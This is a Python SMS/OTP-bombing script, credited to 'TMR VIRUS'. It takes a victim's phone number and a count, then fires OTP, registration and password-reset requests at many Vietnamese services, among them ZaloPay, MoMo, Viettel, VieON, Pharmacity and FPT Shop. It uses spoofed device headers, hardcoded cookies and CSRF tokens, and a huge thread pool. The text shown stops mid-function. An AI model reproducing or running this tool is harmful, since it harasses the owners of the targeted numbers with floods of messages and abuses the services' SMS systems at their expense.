#SOURCE BY TMR VIRUS
#BOX ZALO: https://zalo.me/g/jymelq533
#Không Xoá Dòng Này Để Ton Trọng Tác Giả!!
import json
import urllib.request
import urllib
import uuid
import requests
import hmac
import threading
from concurrent.futures import ThreadPoolExecutor
import hashlib, random ,time
from datetime import datetime
import  base64
from time import sleep
import requests
import os, sys, requests, random, json
import time
from re import search
from random import choice, randint, shuffle
phone = sys.argv[1]
amount = int(sys.argv[2])
threading = ThreadPoolExecutor(max_workers=int(100000))
imei = uuid.uuid4()
ua = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',}
jsdt = {'phone_number': phone}
json_data = {
'feature': 'register',
'phone': '+84'+phone[1:11]}
headers = {
'Host': 'api.zalopay.vn',
'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
'x-device-model': 'iPhone8,2',
'x-density': 'iphone3x',
'authorization': 'Bearer ',
'x-device-os': 'IOS',
'x-drsite': 'off',
'accept': '*/*',
'x-app-version': '7.13.1',
'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
'x-platform': 'NATIVE',
'x-os-version': '14.6'}
params = {'phone_number': "0"+phone[1:11]}
headerss = {
'Host': 'moca.vn',
'Accept': '*/*',
'Device-Token': str(imei),
'X-Requested-With': 'XMLHttpRequest',
'Accept-Language': 'vi',
'X-Moca-Api-Version': '2',
'platform': 'P_IOS-2.10.42',
'User-Agent': 'Pass/2.10.42 (iPhone; iOS 13.3; Scale/2.00)'}
paramss = {'phoneNumber': phone}

def random_string(length):
            number = '0123456789'
            alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
            id = ''
            for i in range(0,length,2):
                id += random.choice(number)
                id += random.choice(alpha)
            return id
def zlpay(phone):
    token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
    json_data = {'phone_number': "0"+phone[1:11],'send_otp_token': token}
    response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text
###
def momo(phone):
    microtime = int(round(time.time() * 1000))
    imei = getimei()
    secureid = get_SECUREID()
    token= get_TOKEN()
    rkey = generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
    aaid = getimei()
    data = {
        "user":"0"+phone[1:11],
        "msgType": "SEND_OTP_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": "0"+phone[1:11],
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "action": "SEND",
            "rkey": rkey,
            "AAID": aaid,
            "IDFA": "",
            "TOKEN": token,
            "SIMULATOR": "",
            "SECUREID": secureid,
            "MODELID": "oppo cph1605mt6755b6z9qwrwhuy9yhrk",
            "isVoice": True,
            "REQUIRE_HASH_STRING_OTP": True,
            "checkSum": ""
        }
    }
    data1 = {
        "user":"0"+phone[1:11],
        "msgType": "CHECK_USER_BE_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": "0"+phone[1:11],
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "checkSum": ""
        }
    }
    h = {
        "agent_id" : "undefined",
        "sessionkey" : "",
        "user_phone" : "undefined",
        "authorization" : "Bearer undefined",
        "msgtype" : "SEND_OTP_MSG",
        "Host" : "api.momo.vn",
        "User-Agent" : "okhttp/3.14.17",
        "app_version": "31062",
        "app_code" : "3.1.6",
        "device_os" : "ANDROID",
        "Content-Type" : "application/json"
    }
    data = json.dumps(data)
    data1 = json.dumps(data1)
    requests.post("https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG",headers=h,data=data1).text
    t = requests.post("https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",headers=h,data=data)
    try:
        t = t.json()
    except:
        t = t.text
def generateRandomString(length, minh):
    return ''.join(random.choices(minh, k=length))
def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))
def getimei():
    return generateRandomString(8, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(12, '0123456789abcdef')
def get_TOKEN():
    return generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+':'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(20, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(12, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(53, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'_'+generateRandomString(11, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(4, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
###
def vntrip(phone):
    response_vntrip = requests.post('https://micro-services.vntrip.vn/core-user-service/verification/request/phone', headers=ua, json=json_data).text
def tv360(phone):
  data="{\"msisdn\":\"phone\"}"
  data=data.replace("phone",phone)
  head={
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json"
}
  rq=requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
def fb(phone):
    headers={
        "authority":"api.onelife.vn",
        "accept":"*/*",
        "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "authorization":"",
        "content-type":"application/json",
        "dnt":"1",
        "origin":"https://kingfoodmart.com",
        "referer":"https://kingfoodmart.com/",
        "sec-ch-ua":"\"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"",
        "sec-ch-ua-mobile":"?0",
        "sec-ch-ua-platform":"\"Windows\"",
        "sec-fetch-dest":"empty",
        "sec-fetch-mode":"cors",
        "sec-fetch-site":"cross-site",
        "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
}
    json_data={
        "operationName":"SendOTP",
        "variables":{
            "phone":phone,
},
        "query":"mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: \"\", email: \"\"}) {\n    otpTrackingId\n    __typename\n  }\n}",
}
    response=requests.post("https://api.onelife.vn/v1/gateway/",headers=headers,json=json_data)
def y360(phone):
    cookies={
        "_gcl_au":"1.1.1985930927.1685500253",
        "_gid":"GA1.2.326096694.1685500253",
        "amp_6e403e":"jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1nq9n9d.1h1nq9n9h.0.1.1",
        "_gat_gtag_UA_211029013_1":"1",
        "_ga_M7ZN50PQ1V":"GS1.1.1685506950.2.0.1685506950.0.0.0",
        "_ga":"GA1.1.671767767.1685500253",
        "_ga_BS2V9QEV6V":"GS1.1.1685506950.2.0.1685506950.0.0.0",
}
    headers={
        "authority":"y360.vn",
        "accept":"application/json",
        "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type":"application/json",
         "cookie":"_gcl_au=1.1.1985930927.1685500253; _gid=GA1.2.326096694.1685500253; amp_6e403e=jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1nq9n9d.1h1nq9n9h.0.1.1; _gat_gtag_UA_211029013_1=1; _ga_M7ZN50PQ1V=GS1.1.1685506950.2.0.1685506950.0.0.0; _ga=GA1.1.671767767.1685500253; _ga_BS2V9QEV6V=GS1.1.1685506950.2.0.1685506950.0.0.0",
        "dnt":"1",
        "origin":"https://y360.vn",
        "referer":"https://y360.vn/hoc/register",
        "sec-ch-ua":"\"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"",
        "sec-ch-ua-mobile":"?0",
        "sec-ch-ua-platform":"\"Windows\"",
        "sec-fetch-dest":"empty",
        "sec-fetch-mode":"cors",
        "sec-fetch-site":"same-origin",
        "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
}
    json_data={
        "phone":phone,
}
    response=requests.post("https://y360.vn/api/v1/user/register",cookies=cookies,headers=headers,json=json_data)
def mocha(phone):
    headers={
        "Accept":"application/json, text/plain, */*",
        "Accept-Language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection":"keep-alive",
        "DNT":"1",
        "Origin":"https://video.mocha.com.vn",
        "Referer":"https://video.mocha.com.vn/",
        "Sec-Fetch-Dest":"empty",
        "Sec-Fetch-Mode":"cors",
        "Sec-Fetch-Site":"same-site",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "sec-ch-ua":"\"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"",
        "sec-ch-ua-mobile":"?0",
        "sec-ch-ua-platform":"\"Windows\"",
}
    params={
        "msisdn":phone,
        "languageCode":"vi",
}
    response=requests.post("https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp",params=params,headers=headers)
def dvcd(phone):
    cookies={
        "laravel_session":"7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2",
        "__zi":"2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1",
        "redirectLogin":"https://viettel.vn/dang-ky",
        "XSRF-TOKEN":"eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D",
}
    headers={
        "Accept":"application/json, text/plain, */*",
        "Accept-Language":"vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection":"keep-alive",
        "Content-Type":"application/json;charset=UTF-8",
        "Origin":"https://viettel.vn",
        "Referer":"https://viettel.vn/dang-ky",
        "Sec-Fetch-Dest":"empty",
        "Sec-Fetch-Mode":"cors",
        "Sec-Fetch-Site":"same-origin",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "X-CSRF-TOKEN":"HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK",
        "X-Requested-With":"XMLHttpRequest",
        "X-XSRF-TOKEN":"eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==",
        "sec-ch-ua":"\"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"",
        "sec-ch-ua-mobile":"?0",
        "sec-ch-ua-platform":"\"Windows\"",
}
    json_data={
        "msisdn":phone,
}
    response=requests.post("https://viettel.vn/api/get-otp",cookies=cookies,headers=headers,json=json_data)
def myvt(phone):
    cookies={
        "laravel_session":"5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF",
        "__zi":"3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1",
        "XSRF-TOKEN":"eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D",
}
    headers={
        "Accept":"application/json, text/plain, */*",
        "Accept-Language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection":"keep-alive",
        "Content-Type":"application/json;charset=UTF-8",
         "Cookie":"laravel_session=5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF; __zi=3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1; XSRF-TOKEN=eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D",
        "DNT":"1",
        "Origin":"https://viettel.vn",
        "Referer":"https://viettel.vn/dang-nhap",
        "Sec-Fetch-Dest":"empty",
        "Sec-Fetch-Mode":"cors",
        "Sec-Fetch-Site":"same-origin",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "X-CSRF-TOKEN":"2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i",
        "X-Requested-With":"XMLHttpRequest",
        "X-XSRF-TOKEN":"eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=",
        "sec-ch-ua":"\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
        "sec-ch-ua-mobile":"?0",
        "sec-ch-ua-platform":"\"Windows\"",
}
    json_data={
        "phone":phone,
        "type":"",
}
    response=requests.post("https://viettel.vn/api/get-otp-login",cookies=cookies,headers=headers,json=json_data)
def dongpus(phone):
    cookies={
    "cf_clearance":"JdfebD5pOAl_X_QXAm_t6XO.aNUQE1cc9V0V1s9oBwE-1691125492-0-1-fb888738.b9fc012.ac89d8d8-150.0.0",
    "_ga_7ZDGMGYGRG":"GS1.2.1692068320.23.1.1692068339.0.0.0",
    "_gid":"GA1.2.664587936.1696067810",
    "_ga_RRJDDZGPYG":"GS1.1.1696067809.47.1.1696067867.2.0.0",
    "_ga":"GA1.2.428506211.1690715309",
}
    headers={
    "authority":"api.dongplus.vn",
    "accept":"*/*",
    "accept-language":"vi",
    "cache-control":"no-cache",
    "content-type":"application/json",
    "origin":"https://dongplus.vn",
    "pragma":"no-cache",
    "referer":"https://dongplus.vn/user/login",
    "sec-ch-ua":"\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-site",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
}
    json_data={
    "phone":phone,
}
    response=requests.post(
    "https://api.dongplus.vn/api/user/send-one-time-password",
    cookies=cookies,
    headers=headers,
    json=json_data,
)
def vieon(phone):
    headers={
    "authority":"api.vieon.vn",
    "accept":"application/json, text/plain, */*",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTMxNDkzMzIsImp0aSI6ImIwNjVjNmJjY2NiZDVmOWU1YjI3NDljOTFkNzc3NjgxIiwiYXVkIjoiIiwiaWF0IjoxNjkwNTU3MzMyLCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY5MDU1NzMzMSwic3ViIjoiYW5vbnltb3VzX2I3YjNmNWY2MTE4NjQyZDI2ZGFmMzBiMjliMzdlYjIyLWMzNzY5Y2IyMDZlMTcwYmY1N2ZjMTYzNTRkMWU1NGI0LTE2OTA1NTczMzIiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiYjdiM2Y1ZjYxMTg2NDJkMjZkYWYzMGIyOWIzN2ViMjItYzM3NjljYjIwNmUxNzBiZjU3ZmMxNjM1NGQxZTU0YjQtMTY5MDU1NzMzMiIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiZHQiOiJ3ZWIiLCJtdGgiOiJhbm9ueW1vdXNfbG9naW4iLCJtZCI6IldpbmRvd3MgMTAiLCJpc3ByZSI6MCwidmVyc2lvbiI6IiJ9.CTNkGxLduRaN6BI1voGjh-evQBQgqFmOeT8clKlGXWw",
    "content-type":"application/x-www-form-urlencoded",
    "origin":"https://vieon.vn",
    "referer":"https://vieon.vn/",
    "sec-ch-ua":"\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-site",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
}
    params={
    "platform":"web",
    "ui":"012021",
}
    data={
    "phone_number":phone,
    "password":"vjyy1234",
    "given_name":"",
    "device_id":"b7b3f5f6118642d26daf30b29b37eb22",
    "platform":"web",
    "model":"Windows 10",
    "push_token":"",
    "device_name":"Chrome/115",
    "device_type":"desktop",
    "isMorePlatform":"true",
    "ui":"012021",
}
    response=requests.post("https://api.vieon.vn/backend/user/register/mobile",params=params,headers=headers,data=data)
def vayvnd(phone):
    cookies={
    "_gcl_au":"1.1.1485182034.1690554215",
    "_fbp":"fb.1.1690554217850.2133224269",
    "_tt_enable_cookie":"1",
    "_ttp":"DoIV2Jy8PmDwkE5BeJGSsNaHzb5",
    "_ym_uid":"1690554219913867740",
    "_ym_d":"1690554219",
    "_gid":"GA1.2.1625556216.1690874386",
    "_ga":"GA1.2.1687428666.1690554217",
    "_ym_isad":"2",
    "_ym_visorc":"b",
    "_ga_P2783EHVX2":"GS1.1.1690951915.4.1.1690951992.60.0.0",
}
    headers={
    "authority":"api.vayvnd.vn",
    "accept":"application/json",
    "accept-language":"vi-VN",
    "content-type":"application/json; charset=utf-8",
    "origin":"https://vayvnd.vn",
    "referer":"https://vayvnd.vn/",
    "sec-ch-ua":"\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-site",
    "site-id":"3",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
}
    json_data={
    "login":phone,
}
    response=requests.post("https://api.vayvnd.vn/v2/users/password-reset",cookies=cookies,headers=headers,json=json_data)
def phar(phone):
    headers={
        "authority":"data-service.pharmacity.io",
        "accept":"image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
        "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "dnt":"1",
        "referer":"https://www.pharmacity.vn/",
        "sec-ch-ua":"\"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"",
        "sec-ch-ua-mobile":"?0",
        "sec-ch-ua-platform":"\"Windows\"",
        "sec-fetch-dest":"image",
        "sec-fetch-mode":"no-cors",
        "sec-fetch-site":"cross-site",
        "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
}
    response=requests.get(
        "https://data-service.pharmacity.io/pmc-ecm-webapp-config-api/production/banner/654%20x%20324-1684304235294.png",
        headers=headers,
)
    headers={
        "authority":"api-gateway.pharmacity.vn",
        "accept":"*/*",
        "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "access-control-request-headers":"content-type",
        "access-control-request-method":"POST",
        "origin":"https://www.pharmacity.vn",
        "referer":"https://www.pharmacity.vn/",
        "sec-fetch-dest":"empty",
        "sec-fetch-mode":"cors",
        "sec-fetch-site":"same-site",
        "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
}
    response=requests.options("https://api-gateway.pharmacity.vn/customers/register/otp",headers=headers)
    headers={
        "authority":"api-gateway.pharmacity.vn",
        "accept":"*/*",
        "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type":"application/json",
        "dnt":"1",
        "origin":"https://www.pharmacity.vn",
        "referer":"https://www.pharmacity.vn/",
        "sec-ch-ua":"\"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"",
        "sec-ch-ua-mobile":"?0",
        "sec-ch-ua-platform":"\"Windows\"",
        "sec-fetch-dest":"empty",
        "sec-fetch-mode":"cors",
        "sec-fetch-site":"same-site",
        "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
}
    json_data={
        "phone":phone,
        "referral":"",
}
    response=requests.post("https://api-gateway.pharmacity.vn/customers/register/otp",headers=headers,json=json_data)
def one(phone):
    cookies={
    "OnCredit_id":"64c6adf3d809f7.01651397",
    "GN_USER_ID_KEY":"0193298a-4d52-4ac4-9ae0-122db6db6511",
    "_fbp":"fb.1.1690742262527.271328962",
    "fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef":"alPojwPZVXiWPE18CbRzCK44S9WQ/FMYyFaayjOBdY4=",
    "_hjSessionUser_1876820":"eyJpZCI6IjJiOWUzOWFkLWQ1NGYtNWZlZi1iNWRlLTc1NmFkOTUxNjA1ZCIsImNyZWF0ZWQiOjE2OTIwNjgxMzMyMjMsImV4aXN0aW5nIjp0cnVlfQ==",
    "_ga_4RZFMB042P":"GS1.2.1692854144.25.1.1692854418.42.0.0",
    "_gid":"GA1.2.542357537.1693898059",
    "_hjSessionUser_2975850":"eyJpZCI6ImJkZjcxOWRjLTAzMWEtNTAxMS04NWU5LTFiMjYyMTRkMTk1YyIsImNyZWF0ZWQiOjE2OTI3MjAxNDAxNjcsImV4aXN0aW5nIjp0cnVlfQ==",
    "SN5c8116d5e6183":"75h0sto1kae3l0mc09r5p9s686",
    "_hjSession_1876820":"eyJpZCI6ImUyZjI0Zjc3LTFiZDQtNDQ2OS1hNmJhLWFhY2UzMmU4ZGZlNCIsImNyZWF0ZWQiOjE2OTM5MjU4Mjk2NDUsImluU2FtcGxlIjpmYWxzZX0=",
    "_hjAbsoluteSessionInProgress":"0",
    "GN_SESSION_ID_KEY":"29adbe68-3565-416e-9163-8b55653a8a59",
    "_gat_UA-139625802-1":"1",
    "_ga":"GA1.1.1734785881.1690742262",
    "_hjIncludedInSessionSample_1876820":"0",
    "_ga_462Z3ZX24C":"GS1.1.1693925829.36.1.1693926598.51.0.0",
}
    headers={
    "authority":"oncredit.vn",
    "accept":"application/json, text/javascript, */*; q=0.01",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "cache-control":"no-cache",
    "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
    "origin":"https://oncredit.vn",
    "pragma":"no-cache",
    "referer":"https://oncredit.vn/registration",
    "sec-ch-ua":"\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "x-requested-with":"XMLHttpRequest",
}
    data={
    "data[typeData]":"sendCodeReg",
    "data[phone]":phone,
    "data[email]":"tronkhai1118@gmail.com",
    "data[captcha1]":"1",
    "data[lang]":"vi",
    "CSRFName":"CSRFGuard_ajax",
    "CSRFToken":"nTrNKNZKfKdTyZ5ND5F269NnT7Z75Y2ZD9SKbAn2332RRrSt7keDRry76Anrnd55",
}
    response=requests.post("https://oncredit.vn/?ajax",cookies=cookies,headers=headers,data=data)
def fptshop(phone):
    response=requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification",headers={"Host":"fptshop.com.vn","content-length":"16","accept":"*/*","content-type":"application/x-www-form-urlencoded; charset=UTF-8","x-requested-with":"XMLHttpRequest","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"\"Linux\"","origin":"https://fptshop.com.vn","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://fptshop.com.vn/","accept-encoding":"gzip, deflate, br"},data={"phone":phone})
def kiotviet(phone):
  def random_string(length):
      import random
      characters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
      result=""
      for _ in range(length):
          result+=random.choice(characters)
      return result
